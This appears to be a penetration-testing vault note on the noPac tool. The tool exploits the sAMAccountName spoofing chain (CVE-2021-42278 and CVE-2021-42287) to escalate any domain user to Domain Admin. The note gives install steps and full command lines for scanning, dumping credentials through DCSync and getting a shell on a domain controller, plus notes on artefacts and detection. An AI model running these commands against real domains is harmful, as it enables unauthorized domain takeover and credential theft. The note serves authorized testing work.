# noPac

**Tags:** #AD #Kerberos #privesc #CVE-2021-42278 #CVE-2021-42287 #impacket

Automated exploit for the **sAMAccountName spoofing** chain (**CVE-2021-42278** + **CVE-2021-42287**), a.k.a. "noPac" / "Sam-the-Admin". Turns *any* authenticated domain user into Domain Admin against an unpatched (pre-November-2021) domain controller, with no special privileges — only the default `MachineAccountQuota`. Ships as two scripts: `scanner.py` (safe vulnerability check) and `noPac.py` (the full exploit).

It automates: create a machine account → clear its SPNs → rename its `sAMAccountName` to a DC's name without the trailing `$` → request a TGT → rename it back so the KDC's fallback resolves the ticket to the real DC → S4U2self to impersonate any user → optional DCSync.

**Source:** https://github.com/Ridter/noPac (also packaged as Sam-the-Admin)
**Install:** `git clone https://github.com/Ridter/noPac && pip3 install -r noPac/requirements.txt` (needs impacket)

```bash
# Always scan first — non-destructive
python3 scanner.py <domain>/<user>:<pass> -dc-ip <dc_ip>

# Full exploit → DCSync
python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc_ip> -dc-host <dc_fqdn> \
  --impersonate Administrator -dump

# Or drop into a semi-interactive shell on the DC
python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc_ip> -dc-host <dc_fqdn> \
  --impersonate Administrator -shell
```

> [!warning] Leaves a machine account behind and generates 4741/4742 (computer account created/changed) plus the `sAMAccountName` rename events. Delete the created account and note the artefacts in the report. The manual impacket/[[Tools/AD/bloodyAD|bloodyAD]] chain (in the ADCS-adjacent Kerberos note) gives finer control when the automated tool trips detection.

> [!note] **See also**
> Services this tool is used against in this vault: [[Services/Active Directory/Kerberos|Kerberos]] — the sAMAccountName-spoofing section with the full manual chain and prerequisites.
> Related tooling: [[Tools/AD/bloodyAD|bloodyAD]] (the `sAMAccountName` rename primitive for the manual path), [[Tools/AD/impacket-kerberos-scripts|impacket Kerberos scripts]] (`getTGT`/`getST` the chain is built from), [[Tools/Credential Dumping/secretsdump|secretsdump]] (the DCSync payoff).

---

*Created: 2026-09-22*
*Updated: 2026-09-22*
*Model: claude-opus-4-8*
